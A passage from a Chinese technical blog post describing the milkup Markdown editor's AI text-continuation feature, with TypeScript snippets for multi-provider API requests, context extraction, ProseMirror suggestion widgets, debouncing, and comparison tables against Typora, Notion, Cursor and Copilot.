  };
</code></pre>
<ol>
<li><strong>Anthropic (Claude)</strong> ：使用 Tool Use 机制</li>
</ol>
<pre><code class="hljs language-css" lang="css">case "anthropic":
  return {
    url: `${config<span class="hljs-selector-class">.baseUrl</span>}/v1/messages`,
    headers: {
      "<span class="hljs-attribute">Content</span>-Type": <span class="hljs-string">"application/json"</span>,
      <span class="hljs-string">"x-api-key"</span>: config.apiKey,
      <span class="hljs-string">"anthropic-version"</span>: <span class="hljs-string">"2023-06-01"</span>
    },
    <span class="hljs-selector-tag">body</span>: {
      model: config.model,
      system: SYSTEM_PROMPT,
      messages: [{ role: <span class="hljs-string">"user"</span>, content: userMessage }],
      tools: [{
        name: <span class="hljs-string">"print_continuation"</span>,
        description: <span class="hljs-string">"输出续写内容"</span>,
        input_schema: {
          type: <span class="hljs-string">"object"</span>,
          properties: {
            continuation: { type: <span class="hljs-string">"string"</span> }
          },
          required: [<span class="hljs-string">"continuation"</span>]
        }
      }],
      tool_choice: { type: <span class="hljs-string">"tool"</span>, name: <span class="hljs-string">"print_continuation"</span> }
    }
  };
</code></pre>
<ol>
<li><strong>Google Gemini</strong>：使用 <code>responseMimeType</code> 和 <code>responseSchema</code></li>
</ol>
<pre><code class="hljs language-css" lang="css">case "gemini":
  return {
    url: `${config<span class="hljs-selector-class">.baseUrl</span>}/v1beta/models/${config<span class="hljs-selector-class">.model</span>}:generateContent?key=${config<span class="hljs-selector-class">.apiKey</span>}`,
    headers: {
      "<span class="hljs-attribute">Content</span>-Type": <span class="hljs-string">"application/json"</span>
    },
    <span class="hljs-selector-tag">body</span>: {
      contents: [{
        parts: [{ text: SYSTEM_PROMPT + <span class="hljs-string">"\n"</span> + userMessage }]
      }],
      generationConfig: {
        temperature: config.temperature,
        responseMimeType: <span class="hljs-string">"application/json"</span>,
        responseSchema: {
          type: <span class="hljs-string">"OBJECT"</span>,
          properties: {
            continuation: { type: <span class="hljs-string">"STRING"</span> }
          },
          required: [<span class="hljs-string">"continuation"</span>]
        }
      }
    }
  };
</code></pre>
<ol>
<li><strong>Ollama</strong>：使用 <code>format</code> 参数指定 JSON Schema</li>
</ol>
<pre><code class="hljs language-css" lang="css">case "ollama":
  return {
    url: `${config<span class="hljs-selector-class">.baseUrl</span>}/api/chat`,
    headers: {
      "<span class="hljs-attribute">Content</span>-Type": <span class="hljs-string">"application/json"</span>
    },
    <span class="hljs-selector-tag">body</span>: {
      model: config.model,
      messages: [
        { role: <span class="hljs-string">"system"</span>, content: SYSTEM_PROMPT },
        { role: <span class="hljs-string">"user"</span>, content: userMessage }
      ],
      format: {
        type: <span class="hljs-string">"object"</span>,
        properties: {
          continuation: { type: <span class="hljs-string">"string"</span> }
        },
        required: [<span class="hljs-string">"continuation"</span>]
      },
      stream: false,
      options: {
        temperature: config.temperature
      }
    }
  };
</code></pre>
<p><strong>设计亮点：</strong></p>
<ul>
<li>统一的接口，隐藏提供商差异</li>
<li>充分利用各提供商的原生能力（JSON Schema、Tool Use）</li>
<li>易于扩展，添加新提供商只需增加一个 case</li>
</ul>
<h4 data-id="heading-28">3.2.3 上下文提取策略</h4>
<p>AI 续写的质量很大程度上取决于上下文的质量。milkup 实现了智能的上下文提取策略。</p>
<p><strong>提取的信息：</strong></p>
<ol>
<li><strong>文件标题</strong>：从文件路径中提取</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> fileTitle = (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">__currentFilePath</span>
  ? (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">__currentFilePath</span>.<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/[\/]/</span>).<span class="hljs-title function_">pop</span>()
  : <span class="hljs-string">"未命名文档"</span>;
</code></pre>
<ol>
<li><strong>前文内容</strong>：获取光标前最近 200 个字符</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">start</span> = Math.max(<span class="hljs-number">0</span>, to - <span class="hljs-number">200</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">previousContent</span> = doc.textBetween(start, to, <span class="hljs-string">"\n"</span>)<span class="hljs-comment">;</span>
</code></pre>
<ol>
<li><strong>标题层级</strong>：遍历文档提取所有标题</li>
</ol>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">const</span> headers: { level: number; <span class="hljs-keyword">text</span>: <span class="hljs-type">string</span> }[] = [];
doc.nodesBetween(<span class="hljs-number">0</span>, <span class="hljs-keyword">to</span>, (node, pos) =&gt; {
  <span class="hljs-keyword">if</span> (node.type.name === <span class="hljs-string">"heading"</span>) {
    <span class="hljs-keyword">if</span> (pos + node.nodeSize &lt;= <span class="hljs-keyword">to</span>) {
      headers.push({
        level: node.attrs.level,
        <span class="hljs-keyword">text</span>: node.textContent
      });
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
});
</code></pre>
<ol>
<li><strong>当前章节</strong>：确定当前所在的章节和子章节</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">sectionTitle</span> = <span class="hljs-string">"未知"</span><span class="hljs-comment">;</span>
let <span class="hljs-attr">subSectionTitle</span> = <span class="hljs-string">"未知"</span><span class="hljs-comment">;</span>

if (headers.length &gt; 0) {
  const <span class="hljs-attr">lastHeader</span> = headers[headers.length - <span class="hljs-number">1</span>]<span class="hljs-comment">;</span>
  <span class="hljs-attr">subSectionTitle</span> = lastHeader.text<span class="hljs-comment">;</span>

  // 查找父级标题
  const <span class="hljs-attr">parentHeader</span> = headers
    .slice(0, -1)
    .reverse()
    .find((h) =&gt; h.level &lt; lastHeader.level)<span class="hljs-comment">;</span>

  if (parentHeader) {
    <span class="hljs-attr">sectionTitle</span> = parentHeader.text<span class="hljs-comment">;</span>
  }
}
</code></pre>
<p><strong>构建 Prompt：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-title function_">buildPrompt</span>(<span class="hljs-attr">context</span>: <span class="hljs-title class_">APIContext</span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`上下文：
文章标题：<span class="hljs-subst">${context.fileTitle || <span class="hljs-string">"未知"</span>}</span>
大标题：<span class="hljs-subst">${context.sectionTitle || <span class="hljs-string">"未知"</span>}</span>
本小节标题：<span class="hljs-subst">${context.subSectionTitle || <span class="hljs-string">"未知"</span>}</span>
前面内容（请紧密衔接）：<span class="hljs-subst">${context.previousContent}</span>`</span>;
}
</code></pre>
<p><strong>System Prompt：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> SYSTEM_PROMPT = `你是一个技术文档续写助手。
严格只输出以下 JSON，**不要有任何前缀、后缀、markdown、换行、解释**：

{<span class="hljs-string">"continuation"</span>: <span class="hljs-string">"接下来只写3–35个汉字的自然衔接内容"</span>}
`;
</code></pre>
<p><strong>设计理念：</strong></p>
<ul>
<li><strong>结构化理解</strong>：不仅提供文本，还提供文档结构</li>
<li><strong>精确定位</strong>：明确当前所在的章节位置</li>
<li><strong>长度控制</strong>：限制 3-35 个汉字，避免过度生成</li>
<li><strong>格式约束</strong>：强制 JSON 输出，便于解析</li>
</ul>
<h4 data-id="heading-29">3.2.4 UI 显示机制</h4>
<p>建议的显示使用 ProseMirror 的 Decoration 系统，在光标位置插入半透明的建议文本。</p>
<p><strong>创建建议 Widget：</strong></p>
<pre><code class="hljs language-ini" lang="ini">// 创建建议元素
const <span class="hljs-attr">widget</span> = document.createElement(<span class="hljs-string">"span"</span>)<span class="hljs-comment">;</span>
<span class="hljs-attr">widget.textContent</span> = result.continuation<span class="hljs-comment">;</span>
<span class="hljs-attr">widget.className</span> = <span class="hljs-string">"ai-completion-suggestion"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">widget.style.color</span> = <span class="hljs-string">"var(--text-color-light, #999)"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">widget.style.opacity</span> = <span class="hljs-string">"0.6"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">widget.style.fontStyle</span> = <span class="hljs-string">"italic"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">widget.style.pointerEvents</span> = <span class="hljs-string">"none"</span><span class="hljs-comment">;  // 不影响鼠标交互</span>
<span class="hljs-attr">widget.style.userSelect</span> = <span class="hljs-string">"none"</span><span class="hljs-comment">;     // 不可选中</span>
<span class="hljs-attr">widget.dataset.suggestion</span> = result.continuation<span class="hljs-comment">;</span>

// 创建装饰器
const <span class="hljs-attr">deco</span> = Decoration.widget(to, widget, { side: <span class="hljs-number">1</span> })<span class="hljs-comment">;</span>
const <span class="hljs-attr">decoSet</span> = DecorationSet.create(view.state.doc, [deco])<span class="hljs-comment">;</span>

// 更新编辑器状态
const <span class="hljs-attr">tr</span> = view.state.tr.setMeta(completionKey, {
  decoration: decoSet,
  suggestion: result.continuation,
  loading: false
})<span class="hljs-comment">;</span>
view.dispatch(tr)<span class="hljs-comment">;</span>
</code></pre>
<p><strong>样式设计：</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.ai-completion-suggestion</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color-<span class="hljs-number">3</span>);
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>;
  <span class="hljs-attribute">font-style</span>: italic;
  <span class="hljs-attribute">pointer-events</span>: none;
  user-select: none;
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.2s</span> ease;

  &amp;<span class="hljs-selector-pseudo">:hover</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.7</span>;
  }
}
</code></pre>
<p><strong>交互设计：</strong></p>
<ol>
<li><strong>Tab 键接受建议</strong>：</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">if (<span class="hljs-attr">event.key</span> === <span class="hljs-string">"Tab"</span>) {
  const <span class="hljs-attr">state</span> = this.getState(view.state)<span class="hljs-comment">;</span>
  if (state?.suggestion) {
    event.preventDefault()<span class="hljs-comment">;</span>

    // 插入建议文本
    const <span class="hljs-attr">tr</span> = view.state.tr.insertText(
      state.suggestion,
      view.state.selection.to
    )<span class="hljs-comment">;</span>

    // 清除建议
    tr.setMeta(completionKey, {
      decoration: DecorationSet.empty,
      suggestion: null,
      loading: false
    })<span class="hljs-comment">;</span>

    view.dispatch(tr)<span class="hljs-comment">;</span>
    return true<span class="hljs-comment">;</span>
  }
}
</code></pre>
<ol>
<li><strong>自动清除机制</strong>：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">apply</span>(<span class="hljs-params">tr, value</span>) {
  <span class="hljs-comment">// 文档内容变化时清除建议</span>
  <span class="hljs-keyword">if</span> (tr.<span class="hljs-property">docChanged</span>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">decoration</span>: <span class="hljs-title class_">DecorationSet</span>.<span class="hljs-property">empty</span>,
      <span class="hljs-attr">suggestion</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>
    };
  }

  <span class="hljs-keyword">return</span> value;
}
</code></pre>
<p><strong>用户体验细节：</strong></p>
<ul>
<li><strong>半透明显示</strong>：不干扰正常阅读</li>
<li><strong>斜体样式</strong>：与正文区分</li>
<li><strong>不可交互</strong>：不影响鼠标点击和文本选择</li>
<li><strong>即时清除</strong>：用户继续输入时自动消失</li>
<li><strong>快捷接受</strong>：Tab 键一键接受</li>
</ul>
<h3 data-id="heading-30">3.3 技术挑战与解决方案</h3>
<h4 data-id="heading-31">3.3.1 结构化输出的挑战</h4>
<p><strong>问题</strong>：不同的 AI 模型对输出格式的控制能力不同，有些模型可能输出额外的文本、markdown 代码块或解释性内容。</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li>
<p><strong>利用各提供商的原生能力</strong>：</p>
<ul>
<li>OpenAI：使用 <code>response_format</code> 的 JSON Schema</li>
<li>Claude：使用 Tool Use 机制</li>
<li>Gemini：使用 <code>responseMimeType</code> 和 <code>responseSchema</code></li>
<li>Ollama：使用 <code>format</code> 参数</li>
</ul>
</li>
<li>
<p><strong>多层解析策略</strong>：</p>
</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-title function_">parseResponse</span>(<span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">CompletionResponse</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 1. 尝试直接 JSON 解析</span>
    <span class="hljs-keyword">const</span> cleanText = text.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/```json\n?|\n?```/g</span>, <span class="hljs-string">""</span>).<span class="hljs-title function_">trim</span>();
    <span class="hljs-keyword">const</span> json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(cleanText);
    <span class="hljs-keyword">if</span> (json.<span class="hljs-property">continuation</span>) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">continuation</span>: json.<span class="hljs-property">continuation</span> };
    }
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">"JSON parse failed, trying regex extraction"</span>);
  }

  <span class="hljs-comment">// 2. 正则提取</span>
  <span class="hljs-keyword">const</span> match = text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/"continuation"\s*:\s*"([^"]+)"/</span>);
  <span class="hljs-keyword">if</span> (match &amp;&amp; match[<span class="hljs-number">1</span>]) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">continuation</span>: match[<span class="hljs-number">1</span>] };
  }

  <span class="hljs-comment">// 3. 兜底策略：如果文本很短且不包含 JSON 结构，直接使用</span>
  <span class="hljs-keyword">if</span> (text.<span class="hljs-property">length</span> &lt; <span class="hljs-number">50</span> &amp;&amp; !text.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"{"</span>)) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">continuation</span>: text.<span class="hljs-title function_">trim</span>() };
  }

  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Failed to parse AI response"</span>);
}
</code></pre>
<p><strong>鲁棒性保证：</strong></p>
<ul>
<li>清理 markdown 代码块标记</li>
<li>正则表达式兜底</li>
<li>短文本直接使用</li>
<li>多层容错机制</li>
</ul>
<h4 data-id="heading-32">3.3.2 防抖与取消机制</h4>
<p><strong>问题</strong>：用户输入时频繁触发 AI 请求，浪费资源且影响体验。</p>
<p><strong>解决方案</strong>：</p>
<ol>
<li><strong>防抖触发</strong>：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> <span class="hljs-attr">debounceTimer</span>: <span class="hljs-title class_">NodeJS</span>.<span class="hljs-property">Timeout</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;

view.<span class="hljs-title function_">updateState</span>(view.<span class="hljs-property">state</span>);

<span class="hljs-comment">// 清除旧的定时器</span>
<span class="hljs-keyword">if</span> (debounceTimer) {
  <span class="hljs-built_in">clearTimeout</span>(debounceTimer);
}

<span class="hljs-comment">// 设置新的定时器</span>
debounceTimer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title class_">AIService</span>.<span class="hljs-title function_">complete</span>(context);

    <span class="hljs-comment">// 显示建议</span>
    <span class="hljs-comment">// ...</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"AI completion failed:"</span>, error);
  }
}, config.<span class="hljs-property">debounceWait</span> || <span class="hljs-number">1500</span>);
</code></pre>
<ol>
<li><strong>请求取消</strong>：</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">let currentAbortController: AbortController | <span class="hljs-attr">null</span> = null<span class="hljs-comment">;</span>

// 取消旧请求
if (currentAbortController) {
  currentAbortController.abort()<span class="hljs-comment">;</span>
}

// 创建新的 AbortController
<span class="hljs-attr">currentAbortController</span> = new AbortController()<span class="hljs-comment">;</span>

const <span class="hljs-attr">response</span> = await fetch(url, {
  signal: currentAbortController.signal,
  // ...
})<span class="hljs-comment">;</span>
</code></pre>
<p><strong>优化效果：</strong></p>
<ul>
<li>减少不必要的 API 调用</li>
<li>节省成本</li>
<li>提升响应速度</li>
<li>避免过时的建议</li>
</ul>
<h4 data-id="heading-33">3.3.3 配置管理与持久化</h4>
<p><strong>问题</strong>：用户配置需要在应用重启后保持，且需要响应式更新。</p>
<p><strong>解决方案</strong>：使用 VueUse 的 <code>useStorage</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useStorage } <span class="hljs-keyword">from</span> <span class="hljs-string">"@vueuse/core"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useAIConfig</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> config = useStorage&lt;<span class="hljs-title class_">AIConfig</span>&gt;(
    <span class="hljs-string">"milkup-ai-config"</span>,
    defaultAIConfig,
    <span class="hljs-variable language_">localStorage</span>,
    { <span class="hljs-attr">mergeDefaults</span>: <span class="hljs-literal">true</span> }
  );

  <span class="hljs-keyword">return</span> { config };
}
</code></pre>
<p><strong>优势：</strong></p>
<ul>
<li>自动同步到 localStorage</li>
<li>响应式更新，配置变化立即生效</li>
<li>支持默认值合并</li>
<li>类型安全</li>
</ul>
<h4 data-id="heading-34">3.3.4 Ollama 模型列表动态获取</h4>
<p><strong>问题</strong>：Ollama 支持多种本地模型，需要动态获取可用模型列表。</p>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchOllamaModels</span>(<span class="hljs-params"/>) {
  loadingModels.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> models = <span class="hljs-keyword">await</span> <span class="hljs-title class_">AIService</span>.<span class="hljs-title function_">getModels</span>(config.<span class="hljs-property">value</span>);
    ollamaModels.<span class="hljs-property">value</span> = models;
  } <span class="hljs-keyword">catch</span> (e) {
    toast.<span class="hljs-title function_">show</span>(<span class="hljs-string">"获取模型列表失败"</span>, <span class="hljs-string">"error"</span>);
  } <span class="hljs-keyword">finally</span> {
    loadingModels.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  }
}

<span class="hljs-comment">// AIService.getModels 实现</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">getModels</span>(<span class="hljs-attr">config</span>: <span class="hljs-title class_">AIConfig</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>[]&gt; {
  <span class="hljs-keyword">if</span> (config.<span class="hljs-property">provider</span> === <span class="hljs-string">"ollama"</span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${config.baseUrl}</span>/api/tags`</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">"GET"</span>
    });
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">models</span>?.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">m: <span class="hljs-built_in">any</span></span>) =&gt;</span> m.<span class="hljs-property">name</span>) || [];
  }
  <span class="hljs-keyword">return</span> [];
}
</code></pre>
<p><strong>用户体验：</strong></p>
<ul>
<li>自动检测本地可用模型</li>
<li>下拉选择，无需手动输入</li>
<li>实时刷新</li>
</ul>
<hr/>
<h2 data-id="heading-35">四、对比分析</h2>
<h3 data-id="heading-36">4.1 即时渲染模式对比</h3>




































































<table><thead><tr><th>特性</th><th>milkup (feat-ir)</th><th>Typora</th><th>Notion</th><th>VS Code + Markdown Preview</th></tr></thead><tbody><tr><td><strong>开源</strong></td><td>✅ 是</td><td>❌ 否</td><td>❌ 否</td><td>✅ 是</td></tr><tr><td><strong>即时渲染</strong></td><td>✅ 是</td><td>✅ 是</td><td>✅ 是</td><td>❌ 否（分栏预览）</td></tr><tr><td><strong>源码可见</strong></td><td>✅ 光标聚焦时显示</td><td>✅ 光标聚焦时显示</td><td>❌ 完全隐藏</td><td>✅ 始终显示</td></tr><tr><td><strong>源码可编辑</strong></td><td>✅ 链接、图片可直接编辑</td><td>⚠️ 部分支持</td><td>❌ 否</td><td>✅ 是</td></tr><tr><td><strong>技术栈</strong></td><td>ProseMirror + Milkdown</td><td>自研</td><td>自研</td><td>CodeMirror</td></tr><tr><td><strong>扩展性</strong></td><td>✅ 插件化架构</td><td>❌ 不支持插件</td><td>⚠️ 有限的 API</td><td>✅ VS Code 插件生态</td></tr><tr><td><strong>性能</strong></td><td>✅ 优秀</td><td>✅ 优秀</td><td>⚠️ 大文档较慢</td><td>✅ 优秀</td></tr><tr><td><strong>跨平台</strong></td><td>✅ Windows/Mac/Linux</td><td>✅ Windows/Mac/Linux</td><td>✅ Web/桌面/移动</td><td>✅ Windows/Mac/Linux</td></tr></tbody></table>
<p><strong>milkup 的优势：</strong></p>
<ul>
<li><strong>开源免费</strong>：完全开源，可自由定制</li>
<li><strong>现代化技术栈</strong>：基于 Vue 3 + TypeScript + ProseMirror</li>
<li><strong>可扩展性强</strong>：插件化架构，易于添加新功能</li>
<li><strong>源码编辑能力</strong>：链接和图片可直接编辑，无需切换模式</li>
</ul>
<p><strong>Typora 的优势：</strong></p>
<ul>
<li><strong>成熟稳定</strong>：经过多年打磨，功能完善</li>
<li><strong>用户体验</strong>：细节打磨到位，交互流畅</li>
</ul>
<p><strong>Notion 的优势：</strong></p>
<ul>
<li><strong>协作能力</strong>：多人实时协作</li>
<li><strong>数据库功能</strong>：不仅是编辑器，还是知识管理工具</li>
</ul>
<h3 data-id="heading-37">4.2 AI 续写功能对比</h3>




































































<table><thead><tr><th>特性</th><th>milkup (feat-ai)</th><th>Cursor</th><th>Notion AI</th><th>GitHub Copilot</th></tr></thead><tbody><tr><td><strong>支持场景</strong></td><td>Markdown 文档</td><td>代码编辑</td><td>文档编辑</td><td>代码编辑</td></tr><tr><td><strong>多提供商</strong></td><td>✅ OpenAI/Claude/Gemini/Ollama</td><td>❌ 仅 OpenAI</td><td>❌ 自有模型</td><td>❌ 仅 GitHub 模型</td></tr><tr><td><strong>本地模型</strong></td><td>✅ 支持 Ollama</td><td>❌ 否</td><td>❌ 否</td><td>❌ 否</td></tr><tr><td><strong>结构化理解</strong></td><td>✅ 理解标题层级</td><td>✅ 理解代码结构</td><td>⚠️ 有限</td><td>✅ 理解代码上下文</td></tr><tr><td><strong>触发方式</strong></td><td>自动防抖触发</td><td>自动触发</td><td>手动触发</td><td>自动触发</td></tr><tr><td><strong>接受方式</strong></td><td>Tab 键</td><td>Tab 键</td><td>点击按钮</td><td>Tab 键</td></tr><tr><td><strong>开源</strong></td><td>✅ 是</td><td>❌ 否</td><td>❌ 否</td><td>❌ 否</td></tr><tr><td><strong>隐私保护</strong></td><td>✅ 支持本地模型</td><td>❌ 数据上传云端</td><td>❌ 数据上传云端</td><td>❌ 数据上传云端</td></tr></tbody></table>
<p><strong>milkup 的优势：</strong></p>
<ul>
<li><strong>多提供商支持</strong>：可自由选择 AI 服务</li>
<li><strong>本地优先</strong>：支持 Ollama，保护隐私</li>
<li><strong>开源透明</strong>：代码公开，可审计</li>
<li><strong>针对 Markdown</strong>：专门优化文档写作场景</li>
</ul>
<p><strong>Cursor/Copilot 的优势：</strong></p>
<ul>
<li><strong>代码专精</strong>：针对代码编辑优化</li>
<li><strong>上下文更丰富</strong>：可以理解整个项目</li>
<li><strong>成熟度高</strong>：经过大量用户验证</li>
</ul>
<p><strong>Notion AI 的优势：</strong></p>
<ul>
<li><strong>多功能</strong>：不仅续写，还支持总结、翻译、改写等</li>
<li><strong>集成度高</strong>：与 Notion 生态深度集成</li>
</ul>
<hr/>
<h2 data-id="heading-38">五、总结与展望</h2>
<h3 data-id="heading-39">5.1 技术总结</h3>
<p>通过 feat-ir 和 feat-ai 两个分支的开发，milkup 在 Markdown 编辑器领域实现了重要突破：</p>
<p><strong>即时渲染模式（feat-ir）：</strong></p>
<ul>
<li>基于 ProseMirror Decoration 系统实现</li>
<li>智能显示源码，光标聚焦时可见</li>
<li>支持链接和图片的即时编辑</li>
<li>性能优化，大文档流畅运行</li>
</ul>
<p><strong>AI 续写功能（feat-ai）：</strong></p>
<ul>
<li>支持 OpenAI、Claude、Gemini、Ollama 等多个提供商</li>
<li>结构化理解文档，提取标题层级和上下文</li>
<li>优雅的 UI 集成，半透明建议不干扰阅读</li>
<li>防抖和取消机制，优化性能和成本</li>
</ul>
<p><strong>技术亮点：</strong></p>
<ol>
<li><strong>插件化架构</strong>：易于扩展和维护</li>
<li><strong>现代化技术栈</strong>：Vue 3 + TypeScript + ProseMirror</li>
<li><strong>用户体验优先</strong>：流畅的交互，优雅的视觉设计</li>
<li><strong>开源透明</strong>：代码公开，社区驱动</li>
</ol>
<h3 data-id="heading-40">5.2 未来展望</h3>
<p><strong>短期计划：</strong></p>
<ol>
<li>
<p><strong>功能完善</strong>：</p>
<ul>
<li>支持更多 Markdown 元素的即时渲染（表格、公式）</li>
<li>AI 续写支持更多场景（代码块、列表）</li>
<li>添加 AI 改写、总结等功能</li>
</ul>
</li>
<li>
<p><strong>性能优化</strong>：</p>
<ul>
<li>大文档性能优化</li>
<li>AI 请求缓存机制</li>
<li>增量渲染</li>
</ul>
</li>
<li>
<p><strong>用户体验</strong>：</p>
<ul>
<li>更丰富的快捷键</li>
<li>自定义主题</li>
<li>更多配置选项</li>
</ul>
</li>
</ol>
<p><strong>长期愿景：</strong></p>
<ol>
<li>
<p><strong>协作能力</strong>：</p>
<ul>
<li>多人实时协作</li>
<li>版本控制集成</li>
<li>评论和批注</li>
</ul>
</li>
<li>
<p><strong>知识管理</strong>：</p>
<ul>
<li>双向链接</li>
<li>标签系统</li>
<li>全文搜索</li>
</ul>
</li>
<li>
<p><strong>AI 深度集成</strong>：</p>
<ul>
<li>智能大纲生成</li>
<li>自动排版优化</li>
<li>多语言翻译</li>
<li>语法检查和改进建议</li>
</ul>
</li>
<li>
<p><strong>生态建设</strong>：</p>
<ul>
<li>插件市场</li>
<li>主题商店</li>
<li>社区贡献</li>
</ul>
</li>
</ol>
<h3 data-id="heading-41">5.3 致谢</h3>
<p>感谢所有为 milkup 项目做出贡献的开发者和用户。特别感谢：</p>
<ul>
<li><strong>Milkdown</strong> 团队：提供了优秀的编辑器框架</li>
<li><strong>ProseMirror</strong> 社区：强大的编辑器内核</li>
<li><strong>Vue.js</strong> 团队：现代化的前端框架</li>
<li><strong>Anthropic</strong>：Claude Code 的开发支持</li>
</ul>
<h3 data-id="heading-42">5.4 参考资源</h3>
<p><strong>项目地址：</strong></p>
<ul>
<li>GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fauto-plugin%2Fmilkup" target="_blank" title="https://github.com/auto-plugin/milkup" ref="nofollow noopener noreferrer">milkup</a></li>
</ul>
<h2 data-id="heading-43">结语</h2>
<p>milkup 的开发是一次有趣的技术探索之旅。我们不仅实现了类似 Typora 的即时渲染模式，还在 AI 集成方面走在了前列。</p>
<p>作为一个开源项目，milkup 的成长离不开社区的支持。我们欢迎任何形式的贡献：代码、文档、建议、bug 报告。让我们一起打造一个更好的 Markdown 编辑器！</p>
<p>如果你对 milkup 感兴趣，欢迎：</p>
<ul>
<li>⭐ Star 项目</li>
<li>🐛 提交 Issue</li>
<li>🔧 贡献代码</li>
<li>💬 加入讨论</li>
</ul>
<p>让我们一起推动 Markdown 编辑器的发展！</p>
<hr/>
<p><strong>作者：</strong> 德莱厄斯 &amp; Claude Code <strong>日期：</strong> 2026 年 2 月 <strong>版本：</strong> v1.0</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何正确取消 ViewModel 里的协程]]></title>    <link>https://juejin.cn/post/7602488187407614004</link>    <guid>https://juejin.cn/post/7602488187407614004</guid>    <pubDate>2026-02-04T00:29:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488187407614004" data-draft-id="7600225000851111971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何正确取消 ViewModel 里的协程"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2026-02-04T00:29:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta 